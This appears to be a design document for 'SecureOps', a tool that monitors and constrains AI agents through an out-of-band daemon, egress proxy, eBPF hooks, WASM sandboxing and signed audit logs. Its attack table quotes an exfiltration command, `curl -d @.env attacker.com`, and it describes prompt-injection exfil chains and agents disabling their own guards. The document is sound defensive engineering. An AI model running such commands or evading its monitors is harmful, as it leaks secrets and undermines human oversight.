# SecureOps - Deep Architecture, Workflows, Impact & Global Rollout

*A design extension of the v2.2.0 codebase analysis + Rust migration blueprint. Part 1 of the source report (system analysis) and Part 2 (migration blueprint) are the foundation; everything here builds on them. Sections marked **(proposed)** are design, not yet implemented.*

> Scope note: "token compression" from the linked page is omitted deliberately - SecureOps makes zero LLM calls and its only in-context surface (the ~1,230-token skill ruleset) is already minimal, so there is no token-cost lever to compress. If that term means something specific to your setup, it can be folded in once defined.

---

## 0. The one idea everything hangs on

The original tool is **observational and lives inside the agent it polices**. A fully compromised agent can switch off its own guard. Every design decision below exists to move the *enforcement boundary outside that process* - from *detect-after-the-fact* to *prevent-at-the-boundary*. Keep this in mind; it is the through-line for the architecture, the impact table, the advanced features, and the global rollout.

---

# Part A - Deep Architecture

## A.1 The three trust rings

The system is best understood not as crates but as three concentric rings of trust, each with a different threat assumption.

```
        ┌──────────────────────────────────────────────────────────┐
        │  RING 2 - ROOT OF TRUST  (privileged out-of-band daemon)   │
        │  separate process · dedicated service user · least-priv    │
        │  ┌──────────────────────────────────────────────────────┐ │
        │  │  Policy Decision Point (PDP)  ·  Signed audit log      │ │
        │  │  Egress proxy + DNS sinkhole  ·  eBPF/LSM enforcer     │ │
        │  │  WASM sandbox host  ·  AlertBus → SQLite               │ │
        │  └──────────────────────────────────────────────────────┘ │
        │                          ▲  unix socket (SO_PEERCRED auth)  │
        │  ┌───────────────────────┼──────────────────────────────┐ │
        │  │  RING 1 - DEGRADED TRUST (in-process napi addon)       │ │
        │  │  audit engine · monitors-in-process · fast feedback    │ │
        │  │  lives & dies WITH the agent - useless once it's owned │ │
        │  │  ┌─────────────────────┼────────────────────────────┐ │ │
        │  │  │  RING 0 - UNTRUSTED (the agent itself)            │ │ │
        │  │  │  OpenClaw runtime · LLM · installed skills · .env │ │ │
        │  │  │  ASSUME FULLY COMPROMISABLE                        │ │ │
        │  │  └───────────────────────────────────────────────────┘ │ │
        │  └─────────────────────────────────────────────────────────┘ │
        └──────────────────────────────────────────────────────────────┘
```

- **Ring 0 - the agent (untrusted).** OpenClaw/Moltbot/Clawdbot, the LLM, every installed skill, and the secrets it can reach (`.env`, credential store). Design assumption: a successful prompt injection or malicious skill can run arbitrary code here. Nothing in Ring 0 is trusted to police itself.
- **Ring 1 - in-process engine (degraded trust).** The napi addon from Phase 1 of the blueprint. It gives fast, in-context audit and monitoring while the agent is healthy, but it shares the agent's fate: if Ring 0 is owned, Ring 1 dies with it. Its job is *feedback and convenience*, not *enforcement*.
- **Ring 2 - the daemon (root of trust).** A separate, privileged, always-on process that survives agent compromise. It owns everything that must keep working *after* the agent is hijacked: the egress chokepoint, kernel-level syscall enforcement, the sandbox host, the policy decision point, alert persistence, and the tamper-evident log.

The strategic payoff (blueprint Phase 4) is entirely about building Ring 2. Phases 1–3 are about getting the shared logic into Rust so Ring 2 can reuse it.

## A.2 PDP/PEP split - the enforcement spine **(proposed)**

Ring 2 is structured as a classic **Policy Decision Point / Policy Enforcement Point** architecture, which keeps one authoritative place for "is this allowed?" and many dumb, fast places that ask it.

| Component | Role | Where |
|---|---|---|
| **PDP** - Policy Decision Point | The single authority. Evaluates policy (Rego/Cedar) against a request + accumulated process context. Answers allow/deny/escalate in µs. | `secureops-policy` |
| **PEP** - egress | Forces all agent network traffic through a local proxy + DNS sinkhole; asks the PDP per connection. | `secureops-proxy` |
| **PEP** - kernel | eBPF hooks on `connect`/`openat`/`execve`; streams events to the PDP; optional LSM-BPF *deny* inline. | `secureops-bpf` |
| **PEP** - execution | `wasmtime` host that grants WASI capabilities only as the PDP permits; fuel/epoch caps. | `secureops-sandbox` |
| **PEP** - gateway hook | The existing `gateway_start` / session hook, now querying the circuit breaker + PDP. | napi shim / daemon |

The value of the split: a new enforcer (say, a filesystem PEP) is added without touching policy, and policy is authored/versioned/tested without touching enforcers. It also means the *same* decision is logged once, centrally, to the signed audit log.

## A.3 Process & privilege model **(proposed)**

Out-of-band only matters if the daemon is *actually* harder to disable than the agent. That requires deliberate privilege separation, not blanket root.

- The daemon runs as a **dedicated service user** (`secureops`), not root, under an init supervisor (systemd / launchd / Windows Service) with `Restart=always` so a kill is self-healing.
- It holds **only the specific capabilities it needs**, fenced by a capability bounding set: on Linux, `CAP_BPF` + `CAP_PERFMON` for eBPF, `CAP_NET_ADMIN` for nftables; nothing else. The WASM host and audit log need no elevated capability at all.
- The agent runs as the **normal user**. It reaches the daemon over a **unix domain socket** whose peer credentials are checked with `SO_PEERCRED` - the daemon authenticates the connecting process's uid/pid rather than trusting a token the agent could leak.
- Signing keys for the audit log live in the **OS keychain or TPM/Secure Enclave** (blueprint already names `keyring` / `tss-esapi`), so even root-on-the-box can't silently forge log entries without leaving evidence.

This is the difference between "a guard the burglar can turn off" and "a guard in a locked room with its own power."

## A.4 Crate map, extended

The blueprint's eight crates cover Rings 0–1 and the shared core. Ring 2 adds the following **(proposed)** crates, all depending inward on `secureops-core`:

```
crates/
  secureops-core/         # (existing plan) types, Check/AuditContext traits, scoring - no I/O
  secureops-checks/       # (existing plan) one Check impl per audit* fn
  secureops-fs/           # (existing plan) tokio::fs context + localhost probe
  secureops-intel/        # (existing plan) signed feed, aho-corasick/strsim, tree-sitter scan
  secureops-crypto/       # (existing plan) aes-gcm + argon2 + zeroize + keyring, v1-readable
  secureops-monitors/     # (existing plan) tokio monitors, AlertBus, sqlite
  secureops-cli/          # (existing plan) clap binary
  secureops-napi/         # (existing plan) .node addon for the TS shim
  # ---- Ring 2 additions ----
  secureops-ipc/          # unix-socket JSON-RPC protocol + SO_PEERCRED auth (shared by daemon, cli, napi)
  secureops-policy/       # the PDP: regorus/cedar eval, hot-reload, decision cache
  secureops-proxy/        # egress PEP: hyper+rustls forward proxy + hickory-dns sinkhole, fail-closed
  secureops-bpf/          # kernel PEP: aya loader + CO-RE BPF programs; ES-framework fallback (macOS)
  secureops-sandbox/      # execution PEP: wasmtime host, WASI capability grants, fuel/epoch
  secureops-auditlog/     # append-only hash chain + ed25519 signing + optional Rekor/RFC3161 anchor
  secureops-daemon/       # the privileged binary that wires PDP + all PEPs + AlertBus + auditlog
```

The dependency rule stays the same as the blueprint: `core` has no I/O, so checks and policy stay unit-testable against a mock `AuditContext`.

## A.5 Why the wire format is load-bearing

Both Ring 1 (napi shim) and Ring 2 (daemon) read and write the same `<stateDir>/.secureops/` files (kill switch, baselines, alerts) and emit the same JSON findings. The blueprint's insistence on `serde(rename_all=…)` byte-compatibility isn't cosmetic - it's what lets a half-migrated install run a TS shim *and* a Rust daemon against the same state without corruption. Treat the JSON schema and the on-disk file shapes as a frozen contract for the whole migration window.

---

# Part B - Workflows

Each workflow is an ordered sequence; the interesting ones are the runtime/enforcement paths that don't exist in the TS tool yet.

## B.1 Bootstrap / install
1. `secureops init` resolves the state dir (`OPENCLAW_STATE_DIR` → `~/.openclaw`).
2. Generates a keystore (v2 format, Argon2id-derived, mode `0o400`) or registers the secret in the OS keychain if `--keychain`.
3. Installs the daemon service unit (least-privilege capability set), but leaves it **disabled** until the operator opts into enforcement.
4. Writes a default policy bundle (audit-only mode) and the bundled IOC database.

## B.2 Audit (read-only)
1. CLI/napi builds an `Arc<dyn AuditContext>` (real `tokio::fs` impl).
2. The `Check` registry is fanned over a `JoinSet`. A panicking check becomes an isolated INFO finding; a missing IOC DB degrades to INFO - **the run never aborts**.
3. Findings aggregate → cross-layer compound-risk pass (`SC-CROSS-001`, fires at ≥3 MAESTRO layers with non-INFO findings) → `score = 100 − Σ deductions` saturating at 0 → summary counts.
4. Reporter emits human console or JSON. `--deep` adds localhost-only port probes.

## B.3 Harden + rollback
1. Create a timestamped backup dir; back up `openclaw.json` + credential/env/auth/memory state.
2. Run the 5 hardening modules in priority order, each mutating config (loopback bind, perms 600/700, 64-hex token, `.env` encrypt, strip insecure flags).
3. Write a manifest. `--rollback [ts]` restores from the chosen (or latest) backup.
4. Network module *generates* firewall rules in TS today; in Ring 2 the proxy/eBPF PEPs **enforce** them (see B.5/B.6).

## B.4 Daemon runtime loop **(proposed)**
1. On start, check the kill switch first (same file contract as TS). If present, refuse to bring up enforcement and log.
2. `init_db` (SQLite migrate: alerts + audit-log tables), spawn the AlertBus consumer, open the signed log.
3. Spawn each monitor *by value* into a `JoinSet`, each holding a clone of the AlertBus sender and a `CancellationToken`.
4. Bring up PEPs: bind the proxy socket + DNS sinkhole, load eBPF programs, start the WASM host, publish the circuit-breaker `watch` channel.
5. Run until signal; `token.cancel()` fans a clean shutdown to every monitor, PEP, and the bus.

## B.5 Egress decision **(proposed)** - the headline path
1. Agent (Ring 0) attempts an outbound connection. DNS goes to the local **sinkhole**; raw connects are routed to the local **proxy** (transparent redirect or explicit `HTTPS_PROXY`).
2. Proxy reads the **SNI / requested host** (no MITM, no cert interception by default) and asks the PDP: *is this destination allowed for this process?*
3. PDP evaluates policy + accumulated process context (e.g. "this PID `openat`'d a credential file 200ms ago"). Returns allow / deny / escalate.
4. **Deny → hard RST**; the bytes never leave the box. Allow → connection proceeds. Either way, one entry is written to the signed audit log.

## B.6 Syscall correlation **(proposed)** - catching the exfil *chain*
1. eBPF programs hook `openat`, `connect`, `execve` in-kernel; events stream to the daemon over a ring buffer with PID/comm attached.
2. The daemon maintains a short per-PID state window. The dangerous pattern is **read-a-secret → then-connect-to-an-unknown-host** - exactly the prompt-injection exfil chain.
3. On match, the PDP can escalate (alert + tripping the circuit breaker) or, with LSM-BPF, **deny the `connect` inline in-kernel**.
4. This promotes the behavioral "Rule 8" heuristic from an LLM suggestion the agent may ignore to a kernel fact the agent cannot evade.

## B.7 Skill execution in the sandbox **(proposed)**
1. A skill invocation is intercepted; the skill is loaded into `wasmtime` rather than executed natively.
2. WASI capabilities are granted from policy: typically *no* filesystem access to `.env`, *no* raw sockets (network only via the proxy), bounded fuel + an epoch deadline.
3. Even an obfuscated `eval`/`child_process` payload that slipped past the tree-sitter scan simply has nothing to call - `.env` is unreachable and the syscall surface is WASI-shaped.

## B.8 IOC feed update **(proposed)** - trustworthy auto-update
1. Conditional GET (`If-None-Match`/ETag) to the feed URL; `304` → keep cache.
2. New bytes arrive → **verify the detached minisign signature over the raw bytes BEFORE parsing**; reject on bad signature.
3. Enforce **version monotonicity** (rollback protection); reject older-than-current.
4. On any failure, fall back to last-good cache, then to the build-time bundled `indicators.json` - preserving today's silent-graceful-degrade behavior.

## B.9 Incident → kill → forensic export
1. A trip (cost breaker, eBPF chain match, canary-token read, or operator `kill --reason`) writes the kill switch and trips the circuit-breaker `watch` channel.
2. The gateway hook sees `*circuit_rx.borrow() == Tripped` and refuses new sessions.
3. `secureops export-incident` produces a signed bundle: the relevant audit-log segment (with its hash-chain proof), matching alerts from SQLite, and the policy version in effect - suitable for IR review and tamper-evident in court/audit.

---

# Part C - Use Cases & Audience

The source report scopes a single self-hosting operator. The Rust enforcement story unlocks a much wider audience; each tier needs different features.

| Tier | Who | Primary needs | Features that matter most |
|---|---|---|---|
| **Solo / hobbyist** | One operator, one agent on a laptop/VPS | Easy hardening, sane defaults, low overhead | Audit + harden, in-process monitors (Ring 1), single binary |
| **Startup / prod team** | A few agent hosts serving real traffic | Persistence, alerting, cost control, CI gating | AlertBus + SQLite, cost circuit breaker, egress proxy |
| **Enterprise fleet** | Hundreds of agent hosts | Central policy, staged rollout, attestation, drift detection | Policy-as-code, fleet control plane, signed log, remote attestation |
| **Regulated / high-assurance** | Finance, health, gov | Non-repudiation, data residency, validated crypto | Tamper-evident signed log, FIPS crypto mode, data-locality, Common Criteria path |
| **CI/CD gate** | Any team shipping agents | Fail the build on weak posture | `audit --json`, score threshold, exit codes, SBOM check |
| **MSSP / platform** | Provider running agents for many tenants | Multi-tenant isolation, HA, per-tenant policy | Tenant-scoped PDP, HA control plane, federated IOC |

The CI/CD case is worth calling out as the cheapest high-value adoption path: `secureops audit --json` with a non-zero exit when `score < threshold` turns the whole audit engine into a pre-deploy gate with zero runtime footprint.

---

# Part D - Tool Impact (attack → outcome)

This is the most concrete way to judge the design: for each real attack, what changes between the TS tool (detect/advise) and the Rust Ring-2 tool (prevent)?

| Attack | TS tool today | Rust Ring 2 **(proposed)** | Enforcing component |
|---|---|---|---|
| Prompt injection runs `curl -d @.env attacker.com` | Maybe flags the pattern; bytes still leave | Unknown host **hard-RST at the proxy**; 0 bytes exfiltrated; chain logged with PID | egress proxy + eBPF |
| Read-`.env`-then-connect exfil chain | Heuristic LLM rule the agent may ignore | Kernel-correlated; optional inline LSM **deny** | eBPF / LSM-BPF |
| Malicious skill with aliased `eval`/`child_process` | Regex scan misses obfuscation | tree-sitter AST catches aliasing at scan; **WASM sandbox** denies the syscall at runtime even if scan missed | intel + sandbox |
| Typosquat dep `clawhubz` / `c1awhub` | Substring `includes` misses novel typos | **Jaro-Winkler + bounded Levenshtein** flags vs canonical brand | intel (strsim) |
| Runaway / cascading cost loop | `setInterval` monitor, in-memory only | Cost breaker as `watch` channel refuses sessions; **WASM fuel** caps per-skill compute | monitors + sandbox |
| Attacker scrubs the incident record | Alerts are in-memory, lost on restart | **Hash-chain break is provable**; segment is signed | auditlog |
| Compromised agent disables its guard | Guard dies with the agent | Daemon is **out-of-band**, separate user, self-restarting - keeps enforcing | daemon / process model |
| C2 over a freshly-registered domain | Bundled static IOC only | **Signed auto-updating feed** + DNS sinkhole + destination-entropy anomaly | intel + proxy + ML |
| Stolen credential used from the box | Not detected | **Canary/honeytoken** read+egress is a high-confidence trip | deception (D-brainstorm) |

The pattern: every row moves from *"we'd have a log of it afterward"* to *"it didn't happen."*

---

# Part E - Upgrade & Advanced Features

## E.1 The blueprint's P0–P3 ladder (recap, by leverage)
The source report already specs these; in priority order they are: enforcing egress proxy/sinkhole (P0), eBPF syscall/egress monitor (P0), WASM skill sandbox (P1), tamper-evident signed audit log (P1), policy-as-code risk profiles (P2), local ML anomaly detection (P2), single static memory-safe binary (P3). Those remain the backbone - don't reorder them; the P0 egress proxy is the single highest-impact item because it neutralizes exfiltration regardless of how the agent was compromised.

## E.2 New brainstorm - features beyond the blueprint **(proposed)**

These extend rather than replace the ladder. Roughly ordered by leverage-per-effort.

- **Honeytokens / canary credentials.** Plant believable fake API keys in decoy `.env`-style files. They're never used legitimately, so *any* read-then-egress of a canary is a near-zero-false-positive compromise signal - cheap, language-agnostic, and works even against novel attacks. Pairs naturally with the eBPF chain detector.
- **Self-tuning seccomp/AppArmor profiles.** Run the agent in a "learn" mode that records its syscall/destination footprint, then generate a tight seccomp-bpf (Linux) profile and switch to "enforce." A self-built sandbox that adapts to each deployment instead of a hand-written allowlist.
- **Remote attestation of the daemon.** For fleets: let the daemon prove to a controller (via TPM quote / measured boot) that an *unmodified* SecureOps is running. Stops "attacker silently replaced the guard binary" at fleet scale.
- **Federated, privacy-preserving IOC sharing.** Operators contribute indicators as **salted hashes** to a signed, append-only transparency log (Certificate-Transparency-style). The community gets fresh indicators; nobody learns another operator's raw data. Keeps the "no central SaaS dependency" ethos by making the log self-hostable/mirrorable.
- **Multi-agent mesh policy (threat T8).** When agents talk to each other, mediate the bus: per-agent capability tokens, mTLS between agents, and PDP-checked message routing - so a hijacked agent can't pivot to manipulate its peers.
- **Network deception / tarpit.** Instead of just RST-ing C2, optionally route it to a tarpit that wastes the attacker's time and yields telemetry on their tooling.
- **Drift / continuous baseline.** Extend the existing SHA-256 baselines from one-shot to continuous: hash the whole config + binary set + skill set, alert on *any* unexpected change, and tie it to attestation.
- **Break-glass workflow.** Emergency policy override requires a signed operator justification, is time-boxed, and is itself written to the tamper-evident log - so the audit trail survives even legitimate emergencies.
- **Observability surfaces.** A `ratatui` TUI and an optional local `axum` + SSE web dashboard, both reading the AlertBus `broadcast` channel; OpenTelemetry export of the alert stream for teams that already run an OTel collector.

## E.3 Crate additions implied by E.2
`tss-esapi` (TPM attestation), `seccompiler` (seccomp profile gen), `ed25519-dalek` + a CT-style log (federated IOC), `rustls`/`rcgen` (mesh mTLS), `ratatui` + `axum` (observability), `opentelemetry` (OTel export). These slot onto the blueprint's consolidated crate list.

---

# Part F - Worldwide Rollout Phase (with subphases)

This is the part the source report doesn't cover at all. "Going worldwide" with a *security* tool introduces its own threats: the update channel becomes a high-value target, a central control plane becomes a new single point of compromise, and audit data starts crossing borders. The subphases below are sequenced so that each one's new attack surface is mitigated before the next is added.

> Design constraint carried throughout: the source tool's defining virtue is **near-zero external attack surface - no telemetry, no SaaS backend, everything local**. Global scale must *preserve* that. Every centralized component here is **optional, self-hostable, and off by default.** That is itself a security property.

## W0 - Multi-platform enforcement parity
The enforcement primitives differ per OS, and that asymmetry is a security issue: an operator must know whether their platform gives kernel-level *deny* or only userspace *detect*.

| Capability | Linux | macOS | Windows |
|---|---|---|---|
| Egress proxy + DNS sinkhole | ✓ | ✓ | ✓ |
| Syscall/egress monitor | eBPF (`aya`) | Endpoint Security framework (FFI) | ETW + WFP |
| Inline kernel **deny** | LSM-BPF | limited (ES is mostly observe) | WFP callout |
| WASM sandbox | ✓ | ✓ | ✓ |
| Signed audit log | ✓ | ✓ | ✓ |

**Subphase rule:** where a platform can only *observe*, the daemon must **fail-closed at the proxy** (which is cross-platform) rather than pretend it has kernel deny. Document the guarantee level per platform explicitly so operators don't over-trust a weaker tier.

## W1 - Packaging & distribution at scale
Globally distributed binaries are a supply-chain bullseye - ironic to get wrong in a supply-chain security tool.
- Per-triple **reproducible builds** (`musl` static targets) so anyone can rebuild and verify the published hash.
- Every release: a **minisign/cosign signature** and a **CycloneDX SBOM**; `cargo-auditable` embeds the dependency graph in the binary; `cargo-deny`/`cargo-vet` gate the supply chain in CI.
- Channels: apt/yum repos, Homebrew, winget, AUR, plus the napi prebuilds as optional platform packages of the npm package (so `npm install` still needs no Rust toolchain).
- **Security issue addressed:** the update/distribution channel is treated as untrusted transport - verification is the client's job, signatures are mandatory, and the transparency log (W2) makes silent malicious releases detectable.

## W2 - Fleet management (optional, self-hostable control plane)
For enterprise/MSSP tiers, central policy and staged rollout - without becoming a SaaS dependency.
- **Enrollment** with mTLS; the daemon authenticates the control plane and vice-versa.
- **Signed policy bundles** distributed to the fleet; the daemon verifies signature + version monotonicity before applying (same discipline as the IOC feed).
- **Staged rollout**: canary → percentage → full, with automatic rollback on health regression. A poisoned or buggy policy push has a blast radius; staging + signing + canary contain it.
- **Remote attestation** (from E.2) so the controller can verify each node runs an unmodified daemon.
- **Security issue addressed:** a central control plane is a new single point of compromise. Mitigations: it's optional and self-hostable, runs least-privilege, speaks only signed/mTLS, and can never push unsigned policy or code.

## W3 - Data residency, privacy & compliance
The moment audit logs and alerts cross borders, you've created both a compliance obligation and an interception risk.
- **Regional storage** for the signed audit log; logs stay in-region by default (EU/US/APAC/etc.).
- **PII minimization** in alerts - store hashes/identifiers, not raw secret material or personal data; the canary mechanism (E.2) is designed to need no PII.
- **Jurisdiction awareness:** GDPR (EU), CCPA (California), PIPL (China), DPDP (India), and similar localization regimes. Telemetry stays **off by default**; any opt-in is regional and explicit.
- **Security issue addressed:** cross-border data flow is itself a confidentiality risk (lawful interception, differing protection standards). Default-local storage + minimization keeps the privacy-respecting posture intact at scale.

## W4 - Localization without semantic drift
The 15 behavioral directives and the CLI/report output need translation for global operators - but translating *security rules* as free text risks changing their meaning.
- Keep behavioral rules as **structured policy** (Rego/Cedar from W-policy), with localized *descriptions* layered on top; the enforced semantics live in the policy, not the prose.
- Localize CLI strings and reports via standard i18n; never localize the finding IDs (`SC-*`) or the JSON wire format.

## W5 - Threat-intel federation & export control
- **Regional + global IOC feeds**, signed, merged deterministically (global baseline + regional overlay), all under the W1 signature discipline.
- **Export-control reality check:** SecureOps ships strong crypto. Distributing cryptographic software touches export regimes (e.g. EAR/ECCN in the US, Wassenaar). A worldwide release needs a classification review and possibly region-gated builds. This is a *legal* security issue, not a technical one, but it blocks shipping if ignored - flag it early to counsel.

## W6 - High availability & global non-repudiation
For MSSP/multi-tenant and regulated tiers:
- HA control plane (active-active, no single region of failure) - still optional/self-hostable.
- **Anchor the audit-log hash chain to a public transparency log** (Rekor) or timestamp authority (RFC3161) so non-repudiation holds across organizational and national boundaries, not just on one box.
- Per-tenant PDP isolation so one tenant's policy or compromise can't affect another.

## W7 - Certifications & assurance
What large/regulated global customers will ask for, and the technical choices each forces:
- **SOC 2 / ISO 27001** for the (optional) control plane operation.
- **FIPS 140-3 validated crypto** as a build mode - this constrains crate choice (e.g. a validated module / `aws-lc-rs`) and must be a feature flag, not the default.
- **Common Criteria** for high-assurance government deployments - drives the formal documentation of the PDP/PEP boundary (Part A.2) and the threat model.

## Worldwide subphase summary

| Subphase | Adds | New attack surface it introduces | How it's contained |
|---|---|---|---|
| W0 | Multi-platform enforcement | Uneven guarantee levels per OS | Document tiers; fail-closed at the cross-platform proxy |
| W1 | Global signed distribution | Update channel as supply-chain target | Mandatory signatures, reproducible builds, SBOM, transparency log |
| W2 | Optional fleet control plane | Central point of compromise | Optional/self-hostable, mTLS, signed-policy-only, staged rollout |
| W3 | Data residency & privacy | Cross-border data exposure | Default-local storage, PII minimization, telemetry off by default |
| W4 | Localization | Semantic drift in translated rules | Rules as structured policy; localize descriptions only |
| W5 | Intel federation | Poisoned regional feeds; export-control breach | Signature discipline; legal classification review |
| W6 | HA + global non-repudiation | Larger trusted infrastructure | Tenant isolation; public transparency-log anchoring |
| W7 | Certifications | Formal-assurance burden | FIPS as feature flag; documented PDP/PEP boundary |

---

# Part G - Consolidated phasing (engineering + global)

The engineering phases (0–4) from the blueprint and the worldwide phases (W0–W7) interleave like this:

1. **Phase 0 - TS hygiene (now):** drop `node-forge`, dedupe injection patterns, hoist `loadIOCDatabase`, fix the 55-vs-56 doc.
2. **Phase 1 - Rust core behind napi:** core + checks + fs + napi; thin TS shim; byte-compatible JSON; standalone `clap` binary in parallel.
3. **Phase 2 - Monitors daemon:** tokio daemon + AlertBus + SQLite + circuit-breaker `watch`.
4. **Phase 3 - Crypto + intel upgrades:** Argon2id/keyring (v1-readable), signed auto-updating feed, aho-corasick/strsim, tree-sitter scanning.
5. **Phase 4 - Enforcement (Ring 2 payoff):** egress proxy + sinkhole → eBPF/LSM monitor → WASM sandbox → policy engine → signed audit log → ML anomaly detection.
6. **Phase W (overlaps Phase 4+):** W0 multi-platform parity, W1 signed global distribution, then W2–W7 as customer tiers demand - each gated on the prior subphase's mitigations being in place.

The discipline that makes the whole thing safe at any point: the JSON wire format and `.secureops/` file contract stay frozen across the migration, every distributed artifact and policy/IOC bundle is signed-and-verified-before-use, and every centralized convenience is optional, self-hostable, and off by default - so a security tool never becomes its users' largest new attack surface.

---

*Codebase facts derive from the verified Part 1 analysis. Everything labelled **(proposed)** - Rings, PDP/PEP split, the Ring-2 crates, the brainstorm features, and all of Part F - is design, not implemented.*